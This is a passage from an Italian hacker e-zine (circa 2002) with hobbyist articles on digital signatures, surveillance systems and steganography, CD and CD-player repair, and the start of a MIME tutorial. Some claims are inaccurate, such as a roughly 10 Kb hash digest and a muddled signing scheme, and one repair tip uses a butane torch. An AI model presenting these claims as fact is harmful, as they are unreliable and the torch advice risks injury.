rispettivamente di autenticazione e di integrita' dei dati, entrambi possono essere
risolti brillantemente da un'altra tecnica prevista dalla crittografia a chiave
pubblica: la firma digitale!! Per poter firmare digitalmente un messaggio basta
cifrarlo con la propia chiave privata; all'arrivo il destinatario cerchera di
decifrarlo con la chiave pubblica del mittente e se la decodifica riuscira' vorra
dire che il messaggio e' intatto. Con questo metodo possiamo prendere 2 piccioni
con una fava, infatti possiamo controllare che il messaggio sia stato effettivamente
scritto dal mittente dichiarato e che il messaggio non sia stato modificato durante
il suo corso!(In questo messaggio e' stato fatto l'esempio che il messaggio non sia
segreto perche' se non lo fosse chiunque potrebbe leggerlo con la chiave pubblica
del destinatario!! Se invece il messaggio fosse stato segreto dovremmo aver agito
in questo modo: scrivere il messaggio  firmarlo sia con la chiave pubblica del
destinatario sia con la chiave privata del mittente. Firmare digitalmente un
messaggio in questo modo genererebbe una gran mole di dati e quindi sarebbe un
processo assai lento.
E' per questo che subentrano le funzioni "hash", ma vediamone subito il funzionamento:
- con l'aiuto di queste funzioni si genera un'impronta ("digest" in inglese) molto
  piccola circa 10 Kb;
- si cifra l'impronta con la propria chiave privata;
- si spediscono insieme il messaggio originale e il digest.
Abbiamo appena visto le azioni che deve compiere il mittente, ora vediamo quelle che
deve compiere il destinatario:
- generare a sua volta l'impronta del messaggio originale;
- decifrare l'impronta spedita assieme al messaggio usando la chiave pubblica del
mittente;
- paragonare l'impronta generata da lui con quella ricevuta.
Se le due impronte combaciano si puo' essere certi che il mittente e sicuramente
colui che dice di essere e che il messaggio non e' stato manomesso da lamererozzi,
dato che basta modificare un solo bit perche' l'impronta sia completamente diversa.
Anche in questo caso ho ipotizzato che il messaggio non sia segreto, comunque se
volete spedirne uno e volete fare in modo che sia leggibile solo dal destinatario
che avete scelto basta cifrare il messaggio con la chiave pubblica del destinatario.
Usando Pgp, secondo me il migliore, potete provare tutte queste cose per far in modo
di assimilarle bene visto che sono azioni non molto intuitive.


Author:  .::[$]wiT::.   2002 (c©
Thank to: a tutti quelli che in questi anni hanno avuto la pazienza di placare i
miei dubbi!!
Made with: GEdit
O.P: LINUX Mandrake 8.1
Cpu: AMD Athlon @ 800 MHz
My mail: secure@fuckmicrosoft.com [Lo so che se non ci fosse la Microsoft noi
non potremmo divertirci!ma.. :-)]
e..una filosofia finale:
Se e' sbagliato usare LINUX, io non voglio essere nel giusto.

------------------------------------*END*--------------------------------------

------------------------------------[35]---------------------------------------
--------------------------------[Boss Fox]-------------------------------------
-------------------[Sistemi di intercettazione e privacy]----------------------


Ormai la maggior parte della gente è venuta a conoscenza di un sistema di
intercettazione chiamato Echelon.
Nelle seguenti righe più che spiegare cos'è Echelon, spiegherò come proteggersi
da questi sistemi.

Il sistema Echelon è nato verso la fine degli anni '80; progettato e amministrato
dalla NSA (già conosciuta per le Crypto AG), è utilizzato per intercettare normali
e-mail, fax, telex e telefonate che viaggiano nella rete di telecomunicazioni
mondiale.
Probabilmente questo lo sanno in molti, ma quello che pochi sanno è l'esistenza di
un sistema chiamato Ermes.

Ermes è stato progettato qui in Italia, precisamente a Torino; esso è un sistema
digitale non lineare che permette di codificare in tempo reale un documento, vasto
anche come la Divina Commedia, man mano che viene inserito nel computer e di
ridurlo con una compressione a cascata, fino a trasformarlo in un micropunto. Poi
basta decodificare il documento con il sistema a regressione non lineare.
Tutto ciò è possibile grazie ad un algoritmo, che è un procedimento di calcolo,
che fornisce un codice per la crittazione, numerico, a numeri non interi, a
dispersione gaussiana, con controllo di errore e di ridondanza casuale a sistema di
equazioni funzionali.
[ Be, ad essere sincero, l'ultima frase non è farina del mio sacco :) ]
Ma chi ci dice che questo Ermes non intercetti a sua volta le nostre comunicazioni?
Se è vero che Ermes può bloccare le intercettazioni di Echelon, perchè non lo usano?
Molte domande aspettano una risposta, ma mentre noi aspettiamo arriva un nuovo
sistema, ancora più potente di Echelon: il DCS 1000, meglio conosciuto come Carnivore.

Carnivore, un programma dell' Fbi che permette di monitorare tutte le comunicazioni
via Internet. Il programma funziona sotto OS Windows, infatti, nel 1999, l'Fbi
impose alla Earthlink di applicare Carnivore al server centrale e questo costrinse
la società a sostituire l'intero sistema operativo.
Una volta installato, Carnivore si assicura un alto livello di accessibilità ai
canali di comunicazione rendendo innocua ogni protezione, interna al server,
relativa ai dati. Questa vulnerabilità può pero rivelarsi pericolosa poichè porge
il fianco agli attacchi informatici degli hacker che una volta impadronitisi del
sistema potrebbero disporre di uno strumento dalle alte potenzialità distruttive.
Poichè come dimostrato dagli studi dell'istituto indipendente IIRTI (International
Intellectual Property Training Institute), chiunque in possesso delle password può
utilizzare il programma, Carnivore può rappresentare una pericolosa arma a doppio
taglio.
I sostenitori di StopCarnivore fanno appello al quarto emendamento della costituzione
americana e hanno dato vita a un'organizzazione che al sito http://www.stopcarnivore.
org/ raccoglie quante più informazioni, adesioni e denunce relative al grande
fratello della rete.

Ma ora vediamo come difenderci...
Se noi cifriamo un documento è ovvio che sarà intercettato con priorità massima.
Allora come fare? Esiste un'altro sistema per inviare dati sensibili in modo sicuro
(vi ricordo che la sicurezza al 100% non esiste), questo metodo si chiama
steganografia.
Ma cosè la steganografia? Essa può essere definita come una tecnica integrativa
alla criptazione. In pratica viene utilizzato un file assolutamente comune (ad
esempio una immagine in formato .bmp o un file musicale .mp3) per introdurvi all'
interno un altro file normalmente criptato contenente informazioni del tutto
estranee alla natura del file principale che lo ospita. In pratica il file .mp3
della nostra canzone preferita può contenere anche un testo, un immagine, una
registrazione vocale in formato diverso dall'mp3 o altro ancora. Inoltre, senza
lo stesso software steganografico che è servito per introdurre il file secondario
all'interno del file principale, risulterà quasi impossibile accorgersi dell'intruso.
L'unico accorgimento necessario a non insospettire i più esperti è quello di
evitare di introdurre troppe informazioni in relazione alle dimensioni del file
ospitante: in pratica se un file .bmp ad esempio contiene un'immagine di circa
700x400 pixel sarà ragionevole attendersi che le relative dimensioni possano essere
comprese fra 750 e 1300 KB circa. Se le dimensioni fossero ad esempio di 6000 KB
gli operatori più esperti potrebbero notare "qualcosa di strano".
Ma vediamo dove trovare questi programmi...
Un programma abbastanza diffuso è s-tools e lo potete trovare all'indirizzo
http://www.ecn.org/crypto/soft/s-tools4.zip
Un'altro programma è il Camouflage, scaricabile da http://www.camouflage.freeserve
.co.uk/Camou121.zip
Ma esistono centinaia di programmi, anche per Unix\Linux e FreeBSD, per una lista
di questi andate all'indirizzo http://members.tripod.com/steganography/stego/
softwareunix.html

Ricordate che dovunque esista un canale di comunicazione, è impossibile controllare
tutte le informazioni che vi transitano.

E con questo vi saluto.

 - Boss Fox -

Saluti al grande LordVicio, alla fantastica Zuccherina, a LordMark, Koder e Bradipo,
e tutti di #noflyzone ed il fortissimo Zerohack.

Una maledizione a tutti i lamer e a quelli che non vogliono insegnare agli altri.

------------------------------------*END*--------------------------------------


------------------------------------[36]---------------------------------------
---------------------------------[evilcry]-------------------------------------
----------------------------[Lettore CD #1,2,3]--------------------------------

-------------*=Come funziona il nostro amato lettore CD=*------------------

*************************************************
Scritto da:Evilcry                              *
e-mail:evilcry@virgilio.it                      *
musica ascoltata:Metal a palla, e Nirvana       *
*************************************************

Ci tengo a dire,che  le info contenute in questa guida sono il risultato della
fusione tra le mie conoscenze e le varie guide che ci sono in giro.

DiscLAIMER:Non mi ritengo assolutamente responsabile di eventuali malfunzionamenti
ai vostri lettori.Io scrivo solo per informare!!!!!

Introduzione:

Salve, questo e' il mio primo tutorz quindi perdonatemi delle cazzate  che ci
saranno;)Dopo aver letto questa guida sarete in grado (spero!)
di poter ovviare ad alcuni mal funzionamenti :)
I primi prototipi di lettori cd nacquero nel 1960,come applicazioni
da laboratorio.All'epoca non esisteva (o quasi) la tecnologia ottica,
pensate che era delle stesse dimensioni di un televisore!.
I lettori iniziarono a diffondersi tra la gente comune dopo
l'introduzione del DIODO LASER. Bella comodità' eh :D .

Motivi per cui conoscere e studiare la tecnologia dei cd:

Veniamo alla parte che c'interessa di più' cioè'
perche' dovremmo imparare come funzia un cd?
Innanzi tutto perche' potremmo imparare a fare delle piccole riparazioni,
senza buttare un accidente di soldi poi perche'....(che cazzo di smanettoni siete
se nn volete studiare!!).

Intro generale ai cd:
La sigla cd-rom significa compact disk-read only memory(a sola lettura).
Le informazioni che troviamo su un normale CD sono registrate sotto
forma di piccolissime fossette .La stampa di un CD avviene in un ambiente
asettico ,infatti il lato in cui si trovano le fossette e' coperto da un sottile
strato d'alluminio, mentre i CD-R (registrabili) hanno una
tecnologia un po' diversa : troviamo prima un solco a spirale ricoperto da uno
strato removibile ,uno d'oro (nn ditemi che n'avete gia' sfasciato uno:D)
poi  uno strato resinoso e in fine l' etichetta.Solitamente lo strato  asportabile
e' di un colore verde che durante la scrittura subisce
il processo burning cioe' di bruciatura, in cui sono scavate le fossette
ed il raggio laser è deviato sullo strato dorato.
Nei moderni DVD (digital versatile disk),nei quali il rapporto di densita'
di informazioni e' di 10:1.Le novita' introdotte in questo sorprendente
gioiello e': il laser ad una maggior frequenza (lunghezza d' onda di circa
670),migliore codifica delle informazioni e minore spaziatura tra le tracce.
Inoltre ci permette una maggiore frq. di campionamento quindi un enorme
qualita' audio.

COME VENGONO MEMORIZZATI E LETTI I DATI:

Prima che i dati siano scritti sul CD devono subire una serie di trasformazioni.
Nel caso si tratti di dati audio,prima il segnale viene filtrato cioe' sono
tagliate le frequenze superiori ai 20 Khz.Poi
avviene una conversione a/c (da analogico a digitale)e la freq. e'
campionata a 44.100 per Mono e 88.200 per la qualita' stereo.Quando
la sorgente e' un nastro digitale a 48 Khz anche sul cd il premastering
(processo precedente alla registrazione) avviene alla stessa freq.
del nastro.Il prossimo processo consiste nella riconversione a 44.100
attraverso processi molto sofisticati.In seguito i campioni a 16 bit
sono codificati in modo da correggere eventuali errori. In fine i dati sono
resi "registrabili" tramite una modulazione tipo 8-14 (non vi spaventate
abbiamo quasi finito :P) e..... finalmente scritti sul cd. Pensate che
la spirale del solco e lunga piu' di 5 km, e con oltre 20.000 volute!!

La correzione degli errori avviene attraverso la codifica chiamata CIRC
Cross Interleave Reed Soloman Code.Questo codice e' diviso in 2 parti:
lo "sparpagliamento" cioe' l' errore viene distribuito per l'intera superficie
del disco in modo da diminuire l' entita' del danno e un codice
per la correzione degli errori di tipo CRC.Grazie a questi due sistemi
abbiamo una correzione di circa 4000 bit che corrisponde ad un foro
di 2,5 mm !Se la correzione avviene completamente, si puo' attaccare
un pezzo di nastro isolante di circa 2mm disposto  radialmente sul disco.
Una volta mi e' capitato vi vedere un cd con un foro che funzionava perfettamente
!questo vale anche per i graffi. Nel caso si presentino
errori non correggibili intervengono 2 dive se tecniche: l' interpolazione
e il muting.Se il numero di campioni buoni e' superiore a quelli cattivi
si usa l' interpolazione lineare.Nel caso in cui il cd sia mal ridotto
interviene il muting cio' nei punti dove ci sono errori l'esecuzione
(vi ricordo che stiamo parlando di cd audio)viene interrotta .Spesso capita che l'
interruzione sia tanto breve che nn ce n'accorgiamo .Se invece si tratta di CD-ROM
la cosa si fa complicata perche' l' errore di un bit e'
inaccettabile .Sigh!:=(

PARLIAMO ADESSO DI COME E' COSTRUITO UN CD:
********************************************************************
Chi non fosse interessato a quest'argomento, lo puo' saltare senza preoccupazioni
di non capire le parti successive.
********************************************************************
Le fossette sono delle depressioni di 0,2 micron cioe'(1/4 della lunghezza
d' onda del laser nel policarbonato--->il principale materiale di cui
e' costituito un CD).Il raggio ha quindi una sfasatura di 180°.Una fossetta
e' larga 0,5 micron e lunga multipli di 0,278 cioe' la lunghezza di un bit
su un cd.

Ogni byte e' convertito in un codice a 14 bit run lenght limited,ricavato
dalla tabella di lookup per ottimizzare i bit. Ad ogni parola di codice a 14
bit sono aggiunti 3 bits per la sincronizzazione e la soppressione bella bassa
frequenza .L' EFM (Eight-to-Fourteen Modulation ),assicura che il
segnale medio non abbia corrente continua in modo da poter ricostruire
il clock per la lettura .Tutto cio' e' unito in frame di 588 bits ,cioe'
24 byte di dati audio(uaohhhh :),riassumiamo:

      Sincronismo             (24 + 3).
      Controllo e display     (14 + 3).
      Dati                    (12 * 2 * (14 + 3)).
      Correzione d'errore     ( 4 * 2 * (14 + 3)).
                              ---------------------
                              totale 588 bits/frame

Penso che approfondire ulteriormente l' argomento sia inutile e noioso.

Bene! i miei complimenti a chi e' riuscito a leggere fin qua giu'!:)
Per oggi abbiamo finito ma nn preoccupatevi che al piu' presto tornero'
ad assillarvi con questo questo -spero- simpatico manualetto


SONO BENE ACCETTE CRITICHE !COSTRUTTIVE!CONSIGLI
NONCHE' Belle Ragazze =:-=)

E ora i saluti a:Bigalex per il magnifico sito,delilah,xpterminator,spyro
[elektro],tutto il chan #hack e  #smanettoni e a chi mi conosce.

Questa quida puo' essere riprodotta a patto che non
venga richiesto denaro, fatta eccezione per le spese di riproduzione.

Byezzzzzzzzzzzz

--------=Come funziona il nostro amato CD-2^parte=-------------------


*******************************
scritto da:evilcry           *
e-mail:evilcry@virgilio.it   *
*******************************

DiscLAIMER=Questo tutorial e' stato scritto scopo educativo e di ricerca.
IL sottoscritto non si assume alcuna responsabilità per l'uso di ciò che viene
spiegato e di eventuali danni.


Bene, ciao a tutti!eccoci alla seconda puntata sui CD.Oggi parleremo di tante
cose riguardanti i CD e la loro riparazione, ma andiamo al dunque :=).

L' ultima volta siamo rimasti a come sono memorizzate le informazioni sul
supporto CD,oggi vedremo alcune caratteristiche fisiche della registrazione
fondamentali per capire il nostro lettore.Tutti i dati contenuti in un CD
sono registrati a velocità costante (Constant Linear Velocity - CLV),questo
sistema ha dei pregi ma anche dei difetti.L' utilizzo del CLV che corrisponde
a 1,2 metri al secondo per velocita'(un disco masterizzato a 1x e' uguale
a 1,2 di CLV),permette di immagazzinare un grande numero di dati,visto che la
densita' di informazioni e' costante. Per esigenze di accesso rapido questo
sistema costringe il lettore a variare continuamente la velocita' in funzione
della traccia o dei dati.

Durante l' esecuzione delle tracce audio,i dati vengono bufferizzati nella RAM
in modo che il lettore non sia costretto a mantenere una velocita' costante.
La tonalita' del suono e' determinata dal clock di lettura dati,il tutto e'
basato su un quarzo oscillatore (cioe' produce corrente oscillante),che controlla
fa frequenza di conversione D/A (da digitale ad analogico).Quindi capiamo che
la precisione
di riproduzione dipende dal quarzo.In definitiva, l'audio in uscita è determinato
 unicamente dalla frequenza di campionamento di 44.100 campioni al secondo; per
questo motivo, il bit rate medio dal disco è di 4,321 Megabit al secondo.

Le tracce sono spaziate di 1,6 micron; quindi un disco da 12 cm ha oltre 20.000
tracce per circa 74 minuti di musica.La larghezza delle fossette su una traccia
è di circa 0,5 micron; il raggio laser focalizzato è largo meno di 2 micron all'
altezza delle fossette percio' ad una grande influenza il tipo di musica.

Per poter capire la precisione che occorre ad un lettore eccovi un'analogia:

Ad una velocità costante di circa 1,2 metri al secondo, la precisione di tracking
richiesta è impressionante (un tracking corretto di un CD equivale a percorrere
oltre 5.000 Km su di un'autostrada larga 3 metri (supponendo un errore di
tracking accettabile minore di +/- 0,35 micron) per un secondo di riproduzione,
oppure oltre 23.040.000 Km per suonare l'intero disco, senza attraversare l' altra
corsia!Per tutto questo tempo occorre anche mantenere il fuoco entro 1 micron (o
con una tolleranza di +/- 0,5 micron). Quindi, è come pilotare un aereo su un largo
3 metri ad un'altitudine di circa 20 Km (corrispondente a 4 mm della tipica
lunghezza focale di una lente dell'obiettivo) con un errore di altitudine minore
di +/- 2 metri! Tutto questo mentre la traccia che c'interessa si sposta sotto di
noi sia orizzontalmente di quasi 2 Km!!!! dello spindle di circa 0,35 mm) senza
tenere conto delle deformazioni o macchie, impronte digitali polvere,che
rapportati alla precisione richiesta equivalgono a montagne:!Quindi prima
di maltrattare un cd pensateci un po' :D

**************Come ovviare ai piccoli malfunzionamenti di un CD*********
uff..! finalmente siamo arrivati alla parte che piu' ci interessa:=)
I graffi paralleli alle tracce sono i piu' problematici perche' possono
degradano la qualita' di esecuzione,o rendere illeggibili grosse porzioni di dati
e nei casi piu' gravi possono far inceppare il pick-up ottico.Qundi che
dirvi! quando notate che un CD e' mal ridotto o deformato evitate assolutamente di
utilizzarlo.

Pulizia Dei CD:
Per pulire la superficie di un cd basta semplicemente una pezzetta con acqua e
sapone,non utilizzate la carta perche' potrebbe rilaciare peluzzi.Quello che mi
raccomando NON utilizzate MAI SOLVENTI.

Come riparare i graffi di un CD:

Per eliminare piccoli graffi dalla superficie esistono tantissime tecniche
ma le piu' efficaci sono le seguenti:

-1 Abrasivi dolci: lucido per plastica o mobili, lucido per metalli o dentifricio
riescono a rimuovere del tutto i piccoli graffi.

-2  Stucchi: cera di tartaruga, cera per automobile o per mobili; applicatela
sull'intera superficie del disco e tamponatela con uno straccetto che non
lasci peluria. Il riempimento dei graffi di maggior dimensione dovrebbe
riuscire abbastanza bene, ma il disco sarà maggiormente soggetto ai danni in
futuro a causa della soffice cera.

-3 (il piu' pericoloso :o) Torcia a butano: questa tecnica  richiede una grande
abilita' (dopo decine di dischi distrutti sono riuscito ad utilizzarla con ottimi
risultati ;) consiste nell'utilizzare una torcia butano delle dimensioni di una
penna per fondere con grande velocita'lo strato superficiale del disco (policarbonato)
in modo da sciogliere i graffi e le  imperfezioni.

CD test:
Attraverso questo CD si riesce a capire effetivamente le potenzialita' di
un lettore.Come CD basta un semplice CD contenente dei dati.Per valutare le
prestazioni nel tracking e nella correzione degli errori, un qualunque CD può
essere trasformato in un CD di test coprendolo con più striscette di nastro
adesivo nero di varia larghezza, un evidenziatore con punta in feltro, o anche
un foro praticato con un trapano! In effetti, alcuni dischi di test professionali
sono realizzati esattamente in questo modo.



Finalmente la parte sul CD e' finita. Dalla prossima volta inizieremo a parlare
del lettore CD che e' molto piu' divertente :=)
byezzzzzzzzzz


Saluti a:BIGAlex,delilah,CityHunter,pex3,[]LoRd[V]icio[],Crashes,[D]kl,tutto
Il canale #hack e #noflyzone


----------------=Come funziona il nostro amato lettore CD=----------------

******************************
Scritto da: Evilcry          *
e-mail:evilcry@virgilio.it   *
******************************

Disclaimer:Questo tutorial e' stato scritto scopo educativo e di ricerca.
IL sottoscritto non si assume nessuna responsabilità per l'uso di ciò che viene
spiegato e quindi eventuali danni.

Salve a tutti, eccoci di nuovo a studiare,questa volta
vedremo come funge un lettore CD.Auguro a tutti una buona lettura,let's go.

[1] Principali componenti di un lettore CD:

-Alimentatore: Nei lettori CD di uno stereo l' alimentatore e' di tipo  lineare
e si trova separato dalla scheda principale onde evitare  surriscaldamenti.

-Scheda elettrica:Questa scheda contiene il processore di controllo,i servo
comandi o attuatori che dir si voglia,elettronica di lettura,i convertitori
D/A (da digitale ad analogico) con i filtri.I trimmer che servono a regolare
i servo comandi,un consiglio NON TOCCATE NIENTE SE NON SAPETE COSA PROVOCA.

-OPTO ELETTRICA cioe' la parte ottica:Questo sistema comprende:

-Il carrello:Il 99% dei lettori in circolazione hanno il carrello motorizzato.

Malfunzionamenti:cinghietta allentata o sporca di olio che impedisce al carrello
di chiudersi ed aprirsi, o di completare il suo ciclo di chiusura. Potrebbero
esserci dei danni meccanici come ingranaggi consumati/spezzati, o parti rotte.
Il pulsante del carrello potrebbe essere sporco, provocando la chiusura del
carrello nei momenti più inaspettati. Il motore potrebbe essere in cortocircuito,
avere degli avvolgimenti aperti o in cortocircuito, o cuscinetti asciutti o
consumati

-Spindle/piattaforma spindle:e' la piattaforma su cui poggia il CD ed e' costruita
in modo da centrare automaticamente il disco e minimizzare le oscillazioni sia in
senso orizzontale sia verticale.

-Motore spindle:E' il motore che fa girare il disco.Normalmente la piattaforma
spindle e' montata a pressione questo motore.I motori piu'comuni
sono quelli a corrente continua cioe' a spazzole simili a quelli delle macchinine.
Il secondo tipo e' a corrente continua e utilizza sensori ad effetto hall per la
commutazione al posto delle spazzole.

-Clamper:E' un magnete che si trova sul lato opposto al motore e alla piattaforma,
e serve per non far slittare il disco.Il clamper viene sollevato
al momento dell' apertura del carrello,quindi volendo liberare un disco basta
abbassare il clamper.

-Slitta:Sulla slitta troviamo montato il pickup ottico,e serve a farlo spostare per
localizzare una determinata traccia o porzione di dati.La slitta scorre scorre
su un binario grazie ad una vite senza vine collegata ad un motore lineare
attraverso un sistema di ingranaggi.


-Motore del pickup:Il motore del pickup utilizzato un normale motore a corrente
continua.

-Pickup ottico=Questo e' il pezzo piu' importate,infatti costituisce la puntina
che legge le informazioni del disco.Nel pickup ottico troviamo gli attuatori del
fuoco e tracking in piu' un sistema di foto diodi.

[2] Uno sguardo piu' approfondito al pickup ottico.

Il pickup ottico e' molto compatto e resistente,nel suo interno troviamo vari
componenti, che sono divisi in 2 categorie: quelli ad ottica fissa e quelli a
ottica mobile.

-Diodo laser:E' un tipo di  diodo laser a raggi infrarossi, che genera una
lunghezza d'onda di 780 nanometri, vicina alla regione dell'infrarosso ed appena
fuori della gamma visibile compresa tra 400 e 700 nanometri. La potenza di uscita
non supera pochi milliWatt, e si riduce ulteriormente a circa 0,25-1,2 milliWatt
all'uscita della lente dell'obiettivo. Un fotodiodo montato all'interno del
contenitore mantiene sotto controllo la potenza di uscita del laser,grazie ad
un loop con feedback per mantenere la potenza di uscita del laser costante ed
estremamente stabile.

-Lente collimatrice:Trasforma il raggio cuneiforme proveniente dal diodo laser
in una serie di raggi paralleli.

-Reticolo di diffrazione:Un pickup a triplo raggio laser,genera due raggi laser
di minor potenza, uno su ciascun lato del raggio principale, che sono utilizzati
per il feedback del tracking che e' assente in un pickup a singolo raggio laser.

-Lente cilindrica:in unione alla lente collimante, costituisce il meccanismo per
realizzare un'accurata messa a fuoco dinamica modificando la forma del raggio di
ritorno in base alla distanza focale.

-Divisore del raggio:Trasferisce il raggio prodotto dal diodo laser alle lenti
dell'obiettivo e al disco, e dirige il raggio di ritorno al sistema di fotodiodi.

-Specchio rotante:Questo specchio trasla (converte:=) i raggi verticali in
orizzontale.

Questi che ho elencato sono i componenti ottici fissi.Tranne i danni causati da
un forte urto che disallinea le guide,questo tipo di componenti non sono soggetti
a guasti.

Ora vediamo  i componenti dell' ottica mobile che sono i piu' delicati.

-Lente dell' obiettivo:Questa lente e' molto simile all' obiettivo di un
microscopio, con un' apertura di circa 0.45 ed un' apertura focale di 4mm
(se vi interessasse l'apertura numerica è definita come il seno dell'angolo che
va dall'asse ottico al bordo dell'obiettivo, visto dall'oggetto :).Ogni
lente e' provvista di una plastica antiriflesso con una sfumatura blu al centro.

-Gruppo dei fotodiodi:Non e' altro che un sistema che rilegge e controlla i dati.

-Attuatore del fuoco:Poiche' il fuoco deve trovarsi entro 1 micron,viene utilizzato
un sistema di servo comandi per la sua regolazione.L' attuatore consiste in una
bobina immersa in un campo magnetico permanente quasi come una bobina di
altoparlanti.L' attuatore sposta la lente in giu' o in su' o piu' vicino o lontano,
in base alle informazioni ricevute dal sistema di fotodiodi.

-Attuatore del tracking:Ha la stessa funzione dell' attuatore di messa a fuoco,
solo che questo permette il cambio di traccia.

ufff...! Finalmente abbiamo finito anche quest' altra parte che molto utile per
le riparazioni.
La prossima volta vedremo come funziona piu' in dettaglio un lettore e come
accedervi per fare qualche riparazione.

SALUTI A:Tutti e in particolare []lord[v]icio,BIGAlex,[v]lad,cityhunter,delilah,
pex3,i canali #hack,#smanettoni,#noflyzone ecc:=)))

Byezzzzzzzz!


------------------------------------*END*--------------------------------------

------------------------------------[37]---------------------------------------
----------------------------------[roxyy]--------------------------------------
------------------------[MIME 1.0 e gli attach nella posta]--------------------

******************************************************************************** 
*                       MIME 1.0 e gli attach nella posta                      * 
*                                       by                                     * 
*                                     roxyyy                                   * 
********************************************************************************

Come sempre quando ti viene un'idea in mente a volte non è il caso di seguire 
l'ispirazione e di pensare ai risvolti :(, sono comunque contento ed orgoglioso 
di questa "piccola e veloce" guida allo standard MIME.... quanti mal di testa a 
redarla ... a volte si tirano i botti per 2 righe lol, unica magra consolazione 
che qualcuno leggera' questo tut Se non lo fate vi uccido :)))) Qualcuno di Voi 
mi ha sollecitato ripetutamente per la stesura di sto tut come vedete mi serviva 
un' po di tempo anche perchè come dattilografo faccio realmente ...are Buona 
lettura e non osate dirmi non abbiamo capito, sarebbe peggio che non leggere il 
tut ;) Per redigere sto testo mi sono cuccato tutte le RFC e STD relative a 
MIME, fate una ricerca e vedrete quante sono, al fine di scremare i casi di 
implimentazione più interessanti, tutte le sintassi e le combinazioni possibili 

L' e-zine ???? inserire sto tut mi sembra un' po esagerato che volete farla di 
300pag ??? :) anche se per l'impegno che ci ho messo ne sarei orgoglioso. E per 
la serie non è finita qui proximi tut su algoritmo in Vb per mime e posta, Mime 
e html e per finire exploit di posta :)così il quadro sarà abbastanza chiaro. 

Un ringrazimento particolare a Meph che sà sempre come farmi passare notti 
insonni :) ciauz fratellini

Una dedica a Krapac, volevi sapere come funge la posta? Spero di accontentarti



***   Introduzione   ***

Ma che azz vuol dire MIME? MIME = Multipurpose Mail Internet Estension qui di 
seguito analizzeremo tutto lo standard MIME 1.0 (tutto quanto di fondamentale 
per capire proceduralmente come fungono le mail). Chiaramente per poter 
comprendere il testo è neccessario sapere come funge SMTP, cos'è un header 
etc... Chi volesse può far riferimento a tutte le guide SMTP in circolazione su 
internet, agli rfc relativi o meglio ancora al tut che ho redato un mesetto fà. 
Per quanto riguarda gli RFC e gli STD vi rimando a un link niente male, può 
servirvi anche per altre cose: http://www.faqs.org/rfcs/ Dalla sua pubblicazione 
nel 1982, RFC 822 ha definito il formato standard di messaggi di posta testuali 
su Internet. Il suo successo è stato talmente elevato cosicché il formato RFC 
822 è stato adottato, totalmente o parzialmente, oltre i confini di Internet e 
del Internet SMTP definiti da RFC 821. Dato che il formato ha vissuto utilizzi 
più ampi, molte limitazioni si sono rivelate sempre più restrittive per la 
comunità di utenti. RFC 822 è stato progettato per specificare un formato per 
messaggi di testo. Come tali, messaggi non-text, come messaggi multimediali che 
potrebbero includere l'audio o le immagini, non sono applicabili facilmente. 
Anche nel caso del solo testo, tuttavia, RFC 822 è inadeguato per le necessità 
di utenti di posta le cui lingue richiedono l'utilizzo delle serie di caratteri 
più ricche di ASCII Americano [US-ASCII 7 bit]. La RFC822, inoltre, non 
specifica meccanismi per posta contenente audio, video, testo asiatico o di 
lingua anche testo nella maggior parte delle lingue europee, in tal contesto 
sono necessarie specifiche aggiuntive Una delle limitazioni rilevanti di RFC 
821/822 è il fatto che limitano il contenuto dei messaggi di posta elettronica 
relativamente a linee di ASCII a sette bit (complessivi 128 caratteri). Questo 
costringe gli utenti a convertire qualsiasi dato non testuale che essi 
desiderano inviare in byte a sette bit.             

Le limitazioni di posta RFC 822 diventano ancora di più evidenti quando i 
gateway sono progettati per permettere lo scambio di messaggi di posta tra host 
RFC 822 e host X.400 (dove all'interno dei messaggi di quest'ultimo ci sono 
parti non testuali che andrebbero perse). 

Questo tut descrive i numerosi meccanismi che si combinano per risolvere la 
maggior parte di questi problemi senza introdurre alcuna incompatibilità grave 
con il mondo esistente di posta RFC 822. In particolare, descriverò:

* Un campo di intestazione [MIME-Version], nel quale viene specificato il numero 
di versione per dichiarare che un messaggio è conforme con questa specifica e 
permette ai client di distinguere fra tali messaggi e quelli generati per 
software più vecchio non-conforme, che si suppone che sia privo di un tale 
campo.

* Un'intestazione [Content-Type], specificato da RFC1049, il quale può essere 
utilizzato per specificare il tipo e il sottotipo di dati nel corpo di un 
messaggio e specificare completamente la rappresentazione nativa di tali dati.

	** Valore "text" che nel Content-Type viene utilizzato per rappresentare 
	informazioni testuali in molte serie di caratteri e in lingue di 
	descrizione di testo formattate in un modo standardizzato.

	** Valore "multipart" che nel Content-Type viene utilizzato per 
	combinare numerose parti di corpo, possibilmente di tipi differenti di 
	dati, in un singolo messaggio.

	** Valore "application" che nel Content-Type viene utilizzato per 
	trasmettere i dati di applicazioni o i dati binari, e perciò, utilizzato 
	per realizzare un servizio di trasferimento file tramite posta 
	elettronica.

	** Valore "message" che nel Content-Type viene utilizzato per 
	incapsulare un messaggio di posta.

	** Valore "image" che nel Content-Type viene utilizzato per trasmettere 
	non dovrò mica dirvi anche questo ... :). 	

	** Valore "audio" che nel Content-Type viene utilizzato per trasmettere 
	audio e voce.

	** valore "video" che nel Content-Type viene utilizzato per trasmettere 
	video o spostare immagini, possibilmente con audio come parte del 
	formato di dati video composito.

* Un campo di intestazione Content-Transfer-Encoding, che può essere utilizzato 
per specificare una codifica ausiliaria applicata ai dati. Permette di 
attraversare meccanismi di trasporto di posta che possono avere limitazioni di 
dati o di serie di caratteri.

* Due campi di intestazione facoltativi che possono essere utilizzati per 
descrivere i dati nel corpo di messaggio: il Content-ID e Content-Description.

E già qua direte che @@, avete voluto la bici ora pedalate :)

MIME è stato progettato con attenzione come un meccanismo estendibile, è 
presumibile che l'insieme di coppie di content-type/sottotipo e dei loro 
parametri associati crescerà significativamente con il tempo. E' probabile che 
numerosi altri campi MIME abbiano nuovi valori definiti nel tempo. Per 
assicurare che l'insieme di tali valori sia sviluppato in uno modo ordinato MIME 
definisce un processo di registrazione che utilizza l'Internet Assigned Numbers 
Authority (IANA) come una registrazione centrale per tali valori. (non ho perso 
tempo a far vedere come gestire IANA se no minimo altre 30pag nessuno ve le 
toglieva).

E ora iniziamo :)



***   Note   ***

All'interno di questo tut troverete delle notazioni in BNF definito in RFC822 
che rappresenta una grammatica e una sintassi formale e completa del sistema di 
posta un po' come nella programmazione la differenza tra linguaggio di progetto 
o linguaggio di programmazione.

Ad esempio il termine crlf si riferisce della sequenza dei due caratteri ASCII 
CR (13) e LF (10) che, presi insieme, in questo ordine, indicano un'interruzione 
di linea.

In questo documento, i valori dell'ottetto sono dati in notazione decimale se 
non diversamente scritto.



***   Il campo di intestazione MIME-Version   ***

RFC 822 è stato pubblicato nel 1982, daquella volta c'è stato realmente solo uno 
